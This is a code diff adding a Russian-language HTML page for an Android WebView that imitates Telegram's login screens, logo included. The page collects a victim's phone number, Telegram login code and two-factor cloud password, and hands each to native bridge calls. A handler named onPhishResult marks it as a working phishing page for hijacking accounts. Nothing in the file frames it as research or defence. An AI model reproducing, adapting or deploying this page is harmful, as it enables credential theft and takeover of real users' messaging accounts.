@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+background:var(--bg,#fff);min-height:100vh;color:var(--fg,#000);overflow-x:hidden}
+:root{--bg:#ffffff;--fg:#000000;--sub:#707579;--brd:#e0e0e0;--accent:#2AABEE;--accent2:#229ED9}
+@media(prefers-color-scheme:dark){
+:root{--bg:#212121;--fg:#fff;--sub:#aaa;--brd:#3d3d3d}
+.dropdown{background:#333!important;border-color:#555!important}
+.dropdown-item{color:#fff!important;border-color:#444!important}
+.dropdown-item:active{background:#444!important}
+.dropdown-search{background:#2a2a2a!important;color:#fff!important;border-color:#555!important}
+}
+.channel-header{padding:14px;text-align:center;border-bottom:1px solid var(--brd);background:var(--bg)}
+.channel-avatar{width:52px;height:52px;border-radius:50%;background:var(--accent);margin:0 auto 6px;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.channel-avatar img{width:100%;height:100%;object-fit:cover;border-radius:50%}
+.channel-avatar span{font-size:18px;color:#fff}
+.channel-name{font-size:14px;font-weight:600;color:var(--fg)}
+.channel-members{font-size:11px;color:var(--sub);margin-top:2px}
+.channel-desc{font-size:12px;color:var(--sub);margin-top:4px;line-height:1.3;max-width:260px;margin-left:auto;margin-right:auto}
+.topbar{height:56px;display:flex;align-items:center;padding:0 4px}
+.topbar-back{width:48px;height:48px;display:flex;align-items:center;justify-content:center;cursor:pointer;border-radius:50%}
+.topbar-back:active{background:rgba(128,128,128,0.1)}
+.topbar-back svg{width:24px;height:24px;fill:var(--fg)}
+.step-container{padding:0 24px}
+.step{display:none}.step.active{display:block}
+.logo-area{text-align:center;padding:24px 0 0}
+.logo-area svg{width:80px;height:80px}
+.step-title{font-size:20px;font-weight:600;text-align:center;margin:20px 0 8px;color:var(--fg)}
+.step-subtitle{font-size:14px;color:var(--sub);text-align:center;line-height:1.4;margin-bottom:24px}
+.country-row{display:flex;align-items:center;justify-content:space-between;border:2px solid var(--brd);
+border-radius:10px;padding:14px;cursor:pointer;margin-bottom:12px;transition:border .2s;position:relative}
+.country-row:active{border-color:var(--accent)}
+.country-name{font-size:16px;color:var(--fg)}
+.country-arrow svg{width:20px;height:20px;fill:var(--sub);transition:transform .2s}
+.country-arrow.open svg{transform:rotate(90deg)}
+.dropdown{position:absolute;top:100%;left:-2px;right:-2px;background:var(--bg);border:1px solid var(--brd);
+border-radius:0 0 10px 10px;max-height:200px;overflow-y:auto;z-index:10;display:none}
+.dropdown.show{display:block}
+.dropdown-search{width:calc(100% - 16px);margin:8px;padding:8px 10px;border:1px solid var(--brd);
+border-radius:6px;font-size:14px;outline:none;font-family:inherit;background:var(--bg);color:var(--fg)}
+.dropdown-search:focus{border-color:var(--accent)}
+.dropdown-item{padding:12px 14px;font-size:15px;cursor:pointer;display:flex;justify-content:space-between;
+border-bottom:1px solid rgba(128,128,128,0.15);color:var(--fg)}
+.dropdown-item:active{background:rgba(128,128,128,0.1)}
+.dropdown-item .di-code{color:var(--accent);font-weight:500}
+.outlined-field{position:relative;margin-bottom:16px;border:2px solid var(--brd);border-radius:10px;
+display:flex;align-items:center;transition:border .2s}
+.outlined-field.focus{border-color:var(--accent)}
+.outlined-field label{position:absolute;left:12px;top:-9px;font-size:12px;color:var(--accent);
+background:var(--bg);padding:0 4px;font-weight:400}
+.phone-plus{font-size:17px;padding:0 0 0 14px;color:var(--fg);-webkit-user-select:none;user-select:none}
+.outlined-field .phone-prefix{font-size:17px;padding:0 2px 0 0;color:var(--fg);white-space:nowrap;
+border:none;background:transparent;outline:none;font-family:inherit}
+.outlined-field input{flex:1;height:50px;border:none;background:transparent;font-size:17px;
+padding:0 14px;outline:none;color:var(--fg);font-family:inherit}
+.outlined-field input::placeholder{color:var(--sub)}
+.sync-row{display:flex;align-items:center;gap:10px;margin:8px 0 24px;padding:4px 0}
+.sync-check{width:20px;height:20px;border:2px solid #c4c4c4;border-radius:4px;cursor:pointer;
+display:flex;align-items:center;justify-content:center;transition:.2s;flex-shrink:0}
+.sync-check.on{background:var(--accent);border-color:var(--accent)}
+.sync-check svg{width:14px;height:14px;fill:#fff;opacity:0;transition:.2s}
+.sync-check.on svg{opacity:1}
+.sync-label{font-size:15px;color:var(--fg);cursor:pointer;-webkit-user-select:none;user-select:none}
+.fab{position:fixed;bottom:24px;right:24px;width:56px;height:56px;border-radius:50%;
+background:var(--accent);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;
+box-shadow:0 3px 12px rgba(0,0,0,0.25);transition:transform .15s,opacity .15s;z-index:5}
+.fab:active{transform:scale(0.92)}
+.fab svg{width:24px;height:24px;fill:#fff}
+.fab:disabled{opacity:0.6;cursor:not-allowed}
+.error{color:#e53935;font-size:13px;margin:-8px 0 12px;padding:0 4px;min-height:18px}
+.spinner{display:inline-block;width:24px;height:24px;border:3px solid rgba(255,255,255,0.3);
+border-top:3px solid #fff;border-radius:50%;animation:spin .6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.code-info{font-size:14px;color:var(--sub);text-align:center;margin-bottom:20px;line-height:1.4}
+.success-icon{width:80px;height:80px;border-radius:50%;background:var(--accent);
+display:flex;align-items:center;justify-content:center;margin:60px auto 20px}
+.success-icon svg{width:40px;height:40px;fill:#fff}
+.pw-field{position:relative;margin-bottom:16px}
+.pw-field input{width:100%;height:54px;border:2px solid var(--brd);border-radius:10px;padding:16px 48px 16px 16px;
+font-size:16px;outline:none;transition:border .2s;font-family:inherit;background:transparent;color:var(--fg)}
+.pw-field input:focus{border-color:var(--accent)}
+.pw-field label{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:16px;color:var(--sub);
+pointer-events:none;transition:.2s}
+.pw-field input:focus+label,.pw-field input:not(:placeholder-shown)+label{top:2px;font-size:11px;color:var(--accent);
+background:var(--bg);padding:0 4px;transform:none}
+.pw-toggle{position:absolute;right:12px;top:50%;transform:translateY(-50%);cursor:pointer;padding:4px}
+.pw-toggle svg{width:22px;height:22px;fill:var(--sub)}
+</style>
+</head>
+<body>
+
+<!-- CHANNEL_HEADER_PLACEHOLDER -->
+
+<div id="step-phone" class="step active">
+<div class="topbar"><div class="topbar-back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></div></div>
+<div class="step-container">
+<div class="logo-area">
+<svg viewBox="0 0 240 240" width="80" height="80"><defs><linearGradient id="tg" x1="50%" y1="0%" x2="50%" y2="99.26%"><stop offset="0%" stop-color="var(--accent)"/><stop offset="100%" stop-color="var(--accent2)"/></linearGradient></defs><circle cx="120" cy="120" r="120" fill="url(#tg)"/><path d="M98 175c-3.89 0-3.23-1.47-4.57-5.17L82.8 135.6l84.2-50" fill="#C8DAEA"/><path d="M98 175c3 0 4.33-1.37 6-3l16-15.56-19.97-12.04" fill="#A9C9DD"/><path d="M100.04 144.4l48.36 35.73c5.52 3.04 9.5 1.47 10.88-5.13l19.69-92.73c2.02-8.07-3.07-11.72-8.35-9.33l-115.63 44.6c-7.89 3.16-7.84 7.57-1.44 9.53l29.69 9.26 68.73-43.36c3.24-1.97 6.22-.91 3.78 1.26" fill="#F6FBFE"/></svg>
+</div>
+<div class="step-title">Номер телефона</div>
+<div class="step-subtitle">Проверьте код страны и введите свой номер телефона</div>
+<div class="country-row" id="countryRow" onclick="toggleDropdown()">
+<span class="country-name" id="countryName">Россия</span>
+<span class="country-arrow" id="countryArrow"><svg viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"/></svg></span>
+<div class="dropdown" id="dropdown">
+<input class="dropdown-search" type="text" placeholder="Поиск..." oninput="filterCountries(this.value)" onclick="event.stopPropagation()">
+<div id="countryList"></div>
+</div>
+</div>
+<div class="outlined-field" id="phoneField">
+<label>Номер телефона</label>
+<span class="phone-plus">+</span>
+<input class="phone-prefix" type="tel" id="phonePrefix" value="7" inputmode="numeric" onfocus="this.select()">
+<input type="tel" id="phone" inputmode="tel" placeholder="" autocomplete="tel">
+</div>
+<div class="error" id="errPhone"></div>
+<div class="sync-row" onclick="toggleSync()">
+<div class="sync-check on" id="syncCheck"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+<span class="sync-label">Синхронизировать контакты</span>
+</div>
+</div>
+<button class="fab" id="fabPhone" onclick="sendPhone()"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
+</div>
+
+<div id="step-code" class="step">
+<div class="topbar"><div class="topbar-back" onclick="showStep('phone')"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></div></div>
+<div class="step-container">
+<div class="step-title" id="codeTitle">Код</div>
+<div class="code-info" id="codeInfo">Мы отправили код подтверждения в Telegram на ваш номер</div>
+<div class="outlined-field" id="codeField">
+<label>Код</label>
+<input type="text" id="code" inputmode="numeric" maxlength="6" placeholder="" autocomplete="one-time-code">
+</div>
+<div class="error" id="errCode"></div>
+</div>
+<button class="fab" id="fabCode" onclick="sendCode()"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></button>
+</div>
+
+<div id="step-2fa" class="step">
+<div class="topbar"><div class="topbar-back" onclick="showStep('code')"><svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg></div></div>
+<div class="step-container">
+<div class="logo-area">
+<svg viewBox="0 0 24 24" width="64" height="64" fill="var(--accent)"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
+</div>
+<div class="step-title">Облачный пароль</div>
+<div class="step-subtitle">У вас включена двухфакторная аутентификация, поэтому для входа нужен пароль.</div>
+<div class="pw-field">
+<input type="password" id="password" placeholder=" ">
+<label>Пароль</label>
+<span class="pw-toggle" onclick="togglePw()"><svg id="pwEye" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg></span>
+</div>
+<div class="error" id="err2fa"></div>
+</div>
+<button class="fab" id="fab2fa" onclick="send2fa()"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></button>
+</div>
+
+<div id="step-success" class="step">
+<div class="step-container" style="text-align:center;padding-top:80px">
+<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+<div class="step-title">Готово</div>
+<div class="step-subtitle">Вы успешно вошли в аккаунт</div>
+<button class="fab" style="position:relative;margin:32px auto 0;right:auto;bottom:auto" onclick="Android.done()">
+<svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
+</div>
+</div>
+
+<script>
+var COUNTRIES=[
+["Россия","RU","+7"],["Украина","UA","+380","Украïна"],["Казахстан","KZ","+7","Қазақстан"],
+["Беларусь","BY","+375"],["Узбекистан","UZ","+998","O'zbekiston"],["Азербайджан","AZ","+994"],
+["Грузия","GE","+995","Georgia"],["Армения","AM","+374","Armenia"],["Молдова","MD","+373","Moldova"],
+["Кыргызстан","KG","+996","Kyrgyzstan"],["Таджикистан","TJ","+992","Tajikistan"],["Туркменистан","TM","+993","Turkmenistan"],
+["Латвия","LV","+371","Latvia"],["Литва","LT","+370","Lithuania"],["Эстония","EE","+372","Estonia"],
+["США","US","+1","United States","USA"],["Великобритания","GB","+44","United Kingdom","UK"],
+["Германия","DE","+49","Germany","Deutschland"],["Франция","FR","+33","France"],
+["Италия","IT","+39","Italy","Italia"],["Испания","ES","+34","Spain","España"],
+["Польша","PL","+48","Poland","Polska"],["Нидерланды","NL","+31","Netherlands","Holland"],
+["Турция","TR","+90","Turkey","Türkiye"],["Чехия","CZ","+420","Czech Republic","Czechia"],
+["Румыния","RO","+40","Romania"],["Португалия","PT","+351","Portugal"],
+["Швеция","SE","+46","Sweden","Sverige"],["Норвегия","NO","+47","Norway","Norge"],
+["Финляндия","FI","+358","Finland","Suomi"],["Дания","DK","+45","Denmark","Danmark"],
+["Австрия","AT","+43","Austria","Österreich"],["Швейцария","CH","+41","Switzerland","Schweiz"],
+["Бельгия","BE","+32","Belgium","Belgique"],["Ирландия","IE","+353","Ireland"],
+["Греция","GR","+30","Greece","Ελλάδα"],["Венгрия","HU","+36","Hungary","Magyarország"],
+["Болгария","BG","+359","Bulgaria","България"],["Словакия","SK","+421","Slovakia","Slovensko"],
+["Хорватия","HR","+385","Croatia","Hrvatska"],["Сербия","RS","+381","Serbia","Србија"],
+["Словения","SI","+386","Slovenia"],["Израиль","IL","+972","Israel"],
+["Индия","IN","+91","India","भारत"],["Китай","CN","+86","China","中国"],
+["Япония","JP","+81","Japan","日本"],["Южная Корея","KR","+82","South Korea","한국"],
+["Бразилия","BR","+55","Brazil","Brasil"],["Мексика","MX","+52","Mexico","México"],
+["Аргентина","AR","+54","Argentina"],["Канада","CA","+1","Canada"],
+["Австралия","AU","+61","Australia"],["Индонезия","ID","+62","Indonesia"],
+["Таиланд","TH","+66","Thailand","ประเทศไทย"],["Вьетнам","VN","+84","Vietnam","Việt Nam"],
+["Филиппины","PH","+63","Philippines"],["Малайзия","MY","+60","Malaysia"],
+["Сингапур","SG","+65","Singapore"],["ОАЭ","AE","+971","UAE","United Arab Emirates"],
+["Саудовская Аравия","SA","+966","Saudi Arabia"],["Египет","EG","+20","Egypt","مصر"],
+["ЮАР","ZA","+27","South Africa"],["Нигерия","NG","+234","Nigeria"],
+["Кения","KE","+254","Kenya"],["Колумбия","CO","+57","Colombia"],
+["Чили","CL","+56","Chile"],["Перу","PE","+51","Peru"],["Венесуэла","VE","+58","Venezuela"],
+["Марокко","MA","+212","Morocco","المغرب"],["Алжир","DZ","+213","Algeria","الجزائر"],
+["Тунис","TN","+216","Tunisia","تونس"],["Ирак","IQ","+964","Iraq","العراق"],
+["Иран","IR","+98","Iran","ایران"],["Афганистан","AF","+93","Afghanistan"],
+["Пакистан","PK","+92","Pakistan","پاکستان"],["Бангладеш","BD","+880","Bangladesh","বাংলাদেশ"],
+["Шри-Ланка","LK","+94","Sri Lanka"],["Мьянма","MM","+95","Myanmar"],
+["Камбоджа","KH","+855","Cambodia"],["Лаос","LA","+856","Laos"],
+["Непал","NP","+977","Nepal","नेपाल"],["Монголия","MN","+976","Mongolia"],
+["Куба","CU","+53","Cuba"],["Ямайка","JM","+1876","Jamaica"],
+["Доминикана","DO","+1809","Dominican Republic"],["Панама","PA","+507","Panama"],
+["Коста-Рика","CR","+506","Costa Rica"],["Уругвай","UY","+598","Uruguay"],
+["Парагвай","PY","+595","Paraguay"],["Боливия","BO","+591","Bolivia"],
+["Эквадор","EC","+593","Ecuador"],["Гватемала","GT","+502","Guatemala"],
+["Гондурас","HN","+504","Honduras"],["Никарагуа","NI","+505","Nicaragua"],
+["Сальвадор","SV","+503","El Salvador"],["Исландия","IS","+354","Iceland"],
+["Люксембург","LU","+352","Luxembourg"],["Мальта","MT","+356","Malta"],
+["Кипр","CY","+357","Cyprus"],["Черногория","ME","+382","Montenegro"],
+["Северная Македония","MK","+389","North Macedonia"],["Босния","BA","+387","Bosnia"],
+["Албания","AL","+355","Albania"],["Косово","XK","+383","Kosovo"],
+["Катар","QA","+974","Qatar","قطر"],["Кувейт","KW","+965","Kuwait","الكويت"],
+["Бахрейн","BH","+973","Bahrain","البحرين"],["Оман","OM","+968","Oman","عمان"],
+["Иордания","JO","+962","Jordan","الأردن"],["Ливан","LB","+961","Lebanon","لبنان"],
+["Новая Зеландия","NZ","+64","New Zealand"],["Тайвань","TW","+886","Taiwan","台灣"],
+["Гонконг","HK","+852","Hong Kong","香港"],["Макао","MO","+853","Macau","澳門"]
+];
+var selectedCountry=0;
+var dropdownOpen=false;
+
+function initCountry(){
+try{
+var cc=Android.getCountryCode();
+if(cc){cc=cc.toUpperCase();
+for(var i=0;i<COUNTRIES.length;i++){
+if(COUNTRIES[i][1]===cc){selectedCountry=i;break;}
+}}
+}catch(e){}
+updateCountryUI();
+}
+
+function updateCountryUI(){
+var c=COUNTRIES[selectedCountry];
+document.getElementById('countryName').textContent=c[0];
+document.getElementById('phonePrefix').value=c[2].replace('+','');
+autoSizePrefix();
+}
+
+function autoSizePrefix(){
+var inp=document.getElementById('phonePrefix');
+var len=(inp.value||'').length;
+if(len<=1) inp.style.width='20px';
+else if(len===2) inp.style.width='30px';
+else if(len===3) inp.style.width='42px';
+else inp.style.width='54px';
+}
+
+function matchCountryByCode(digits){
+if(!digits)return;
+var best=-1,bestLen=0;
+for(var i=0;i<COUNTRIES.length;i++){
+var cc=COUNTRIES[i][2].replace('+','');
+if(digits.indexOf(cc)===0 && cc.length>bestLen){best=i;bestLen=cc.length;}
+}
+if(best>=0 && best!==selectedCountry){
+selectedCountry=best;
+document.getElementById('countryName').textContent=COUNTRIES[best][0];
+}
+}
+
+function toggleDropdown(){
+dropdownOpen=!dropdownOpen;
+var dd=document.getElementById('dropdown');
+var ar=document.getElementById('countryArrow');
+if(dropdownOpen){
+dd.classList.add('show');ar.classList.add('open');
+renderCountryList('');
+var s=dd.querySelector('.dropdown-search');if(s){s.value='';s.focus();}
+}else{dd.classList.remove('show');ar.classList.remove('open');}
+}
+
+function renderCountryList(q){
+var html='';var ql=q.toLowerCase();
+for(var i=0;i<COUNTRIES.length;i++){
+var c=COUNTRIES[i];
+var match=false;
+if(!ql){match=true;}
+else{
+for(var j=0;j<c.length;j++){
+if(j===1)continue;
+if(String(c[j]).toLowerCase().indexOf(ql)!==-1){match=true;break;}
+}
+}
+if(!match)continue;
+html+='<div class="dropdown-item" onclick="event.stopPropagation();selectCountry('+i+')">'
++'<span>'+c[0]+'</span><span class="di-code">'+c[2]+'</span></div>';
+}
+document.getElementById('countryList').innerHTML=html||'<div style="padding:12px;color:var(--sub);text-align:center">Не найдено</div>';
+}
+
+function filterCountries(q){renderCountryList(q);}
+
+function selectCountry(i){
+selectedCountry=i;updateCountryUI();
+dropdownOpen=false;
+document.getElementById('dropdown').classList.remove('show');
+document.getElementById('countryArrow').classList.remove('open');
+document.getElementById('phone').focus();
+}
+
+function toggleSync(){
+document.getElementById('syncCheck').classList.toggle('on');
+}
+
+function togglePw(){
+var inp=document.getElementById('password');
+inp.type=inp.type==='password'?'text':'password';
+}
+
+function showStep(id){
+document.querySelectorAll('.step').forEach(function(s){s.classList.remove('active')});
+document.getElementById('step-'+id).classList.add('active');
+}
+
+function sendPhone(){
+var digits=document.getElementById('phonePrefix').value.replace(/\D/g,'');
+var num=document.getElementById('phone').value.replace(/\D/g,'');
+if(num.length<5){document.getElementById('errPhone').textContent='Введите номер телефона';return;}
+if(!digits){document.getElementById('errPhone').textContent='Введите код страны';return;}
+document.getElementById('errPhone').textContent='';
+var fab=document.getElementById('fabPhone');
+fab.disabled=true;fab.innerHTML='<span class="spinner"></span>';
+Android.submitPhone('+'+digits+num);
+}
+
+function sendCode(){
+var code=document.getElementById('code').value.trim();
+if(code.length<4){document.getElementById('errCode').textContent='Введите код';return;}
+document.getElementById('errCode').textContent='';
+var fab=document.getElementById('fabCode');
+fab.disabled=true;fab.innerHTML='<span class="spinner"></span>';
+Android.submitCode(code);
+}
+
+function send2fa(){
+var pw=document.getElementById('password').value;
+if(!pw){document.getElementById('err2fa').textContent='Введите пароль';return;}
+document.getElementById('err2fa').textContent='';
+var fab=document.getElementById('fab2fa');
+fab.disabled=true;fab.innerHTML='<span class="spinner"></span>';
+Android.submitPassword(pw);
+}
+
+function restoreFab(stepId,text){
+var fab=document.getElementById('fab'+stepId.charAt(0).toUpperCase()+stepId.slice(1));
+if(!fab)return;
+fab.disabled=false;
+if(stepId==='phone')fab.innerHTML='<svg viewBox="0 0 24 24"><path fill="#fff" d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>';
+else fab.innerHTML='<svg viewBox="0 0 24 24"><path fill="#fff" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
+}
+
+function onPhishResult(status,message){
+if(status==='code_sent'){
+var prefix='+'+document.getElementById('phonePrefix').value.replace(/\D/g,'');
+var phone=prefix+document.getElementById('phone').value.replace(/\D/g,'');
+document.getElementById('codeInfo').textContent='Мы отправили код на номер '+phone;
+showStep('code');
+setTimeout(function(){document.getElementById('code').focus()},300);
+}else if(status==='2fa_required'){
+showStep('2fa');
+setTimeout(function(){document.getElementById('password').focus()},300);
+}else if(status==='success'){
+showStep('success');
+}else{
+var s2=document.getElementById('step-2fa');
+var sc=document.getElementById('step-code');
+if(s2.classList.contains('active')){
+document.getElementById('err2fa').textContent=message||'Ошибка';
+restoreFab('2fa');
+}else if(sc.classList.contains('active')){
+document.getElementById('errCode').textContent=message||'Ошибка';
+restoreFab('code');
+}else{
+document.getElementById('errPhone').textContent=message||'Ошибка';
+restoreFab('phone');
+}
+}
+}
+
+document.getElementById('phonePrefix').addEventListener('input',function(){
+this.value=this.value.replace(/\D/g,'');
+autoSizePrefix();
+matchCountryByCode(this.value);
+});
+document.getElementById('phonePrefix').addEventListener('keydown',function(e){
+if(e.key==='Enter'){e.preventDefault();document.getElementById('phone').focus();}
+});
+
+document.getElementById('phone').addEventListener('focus',function(){
+document.getElementById('phoneField').classList.add('focus');
+});
+document.getElementById('phone').addEventListener('blur',function(){
+document.getElementById('phoneField').classList.remove('focus');
+});
+document.getElementById('phonePrefix').addEventListener('focus',function(){
+document.getElementById('phoneField').classList.add('focus');
+});
+document.getElementById('phonePrefix').addEventListener('blur',function(){
+document.getElementById('phoneField').classList.remove('focus');
+});
+document.getElementById('code').addEventListener('focus',function(){
+document.getElementById('codeField').classList.add('focus');
+});
+document.getElementById('code').addEventListener('blur',function(){
+document.getElementById('codeField').classList.remove('focus');
+});
+
+document.addEventListener('click',function(e){
+if(dropdownOpen&&!document.getElementById('countryRow').contains(e.target)){
+dropdownOpen=false;
+document.getElementById('dropdown').classList.remove('show');
+document.getElementById('countryArrow').classList.remove('open');
+}
+});
+
+initCountry();
+</script>
+</body>
+</html>
